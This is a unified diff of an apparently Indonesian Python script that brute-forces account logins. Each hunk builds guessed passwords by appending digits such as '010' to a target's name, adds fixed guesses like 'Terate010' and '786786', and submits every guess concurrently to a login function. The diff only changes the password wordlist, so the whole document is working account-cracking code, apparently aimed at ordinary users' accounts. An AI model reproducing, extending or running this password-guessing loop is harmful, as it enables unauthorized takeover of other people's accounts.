@@ -215,15 +215,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '10',
-                         str(x) + '11',
-                         str(x) + '12',
-                         str(x) + '13'
+                         str(x) + '010',
+                         str(x) + '011',
+                         str(x) + '012',
+                         str(x) + '013'
                          ]
-                    litpas.append('Nahoen')
-                    litpas.append('nahoen')
-                    litpas.append('Hetmalu')
-                    litpas.append('hetmalu')
+                    litpas.append('Terate010')
+                    litpas.append('Terate011')
+                    litpas.append('Terate012')
+                    litpas.append('Terate013')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -249,15 +249,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '10',
-                         str(x) + '11',
-                         str(x) + '12',
-                         str(x) + '13'
+                         str(x) + '010',
+                         str(x) + '011',
+                         str(x) + '012',
+                         str(x) + '013'
                          ]
-                    litpas.append('Nahoen')
-                    litpas.append('nahoen')
-                    litpas.append('Hetmalu')
-                    litpas.append('hetmalu')
+                    litpas.append('Terate010')
+                    litpas.append('Terate011')
+                    litpas.append('Terate012')
+                    litpas.append('Terate013')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '10',
-                           str(x) + '11',
-                           str(x) + '12',
-                           str(x) + '13'
+                           str(x) + '010',
+                           str(x) + '011',
+                           str(x) + '012',
+                           str(x) + '013'
                            ]
-                      litpas.append('Nahoen')
-                      litpas.append('nahoen')
-                      litpas.append('Hetmalu')
-                      litpas.append('hetmalu')
+                      litpas.append('Terate010')
+                      litpas.append('Terate011')
+                      litpas.append('Terate012')
+                      litpas.append('Terate013')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '10',
-                           str(x) + '11',
-                           str(x) + '12',
-                           str(x) + '13'
+                           str(x) + '010',
+                           str(x) + '011',
+                           str(x) + '012',
+                           str(x) + '013'
                            ]
-                      litpas.append('Nahoen')
-                      litpas.append('nahoen')
-                      litpas.append('Hetmalu')
-                      litpas.append('hetmalu')
+                      litpas.append('Terate010')
+                      litpas.append('Terate011')
+                      litpas.append('Terate012')
+                      litpas.append('Terate013')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -331,15 +331,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '10',
-                           str(x) + '11',
-                           str(x) + '12',
-                           str(x) + '13'
+                           str(x) + '010',
+                           str(x) + '011',
+                           str(x) + '012',
+                           str(x) + '013'
                            ]
-                      litpas.append('Nahoen')
-                      litpas.append('nahoen')
-                      litpas.append('Hetmalu')
-                      litpas.append('hetmalu')
+                      litpas.append('Terate010')
+                      litpas.append('Terate011')
+                      litpas.append('Terate012')
+                      litpas.append('Terate013')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -355,15 +355,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '10',
-                           str(x) + '11',
-                           str(x) + '12',
-                           str(x) + '13'
+                           str(x) + '010',
+                           str(x) + '011',
+                           str(x) + '012',
+                           str(x) + '013'
                            ]
-                      litpas.append('Nahoen')
-                      litpas.append('nahoen')
-                      litpas.append('Hetmalu')
-                      litpas.append('hetmalu')
+                      litpas.append('Terate010')
+                      litpas.append('Terate011')
+                      litpas.append('Terate012')
+                      litpas.append('Terate013')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
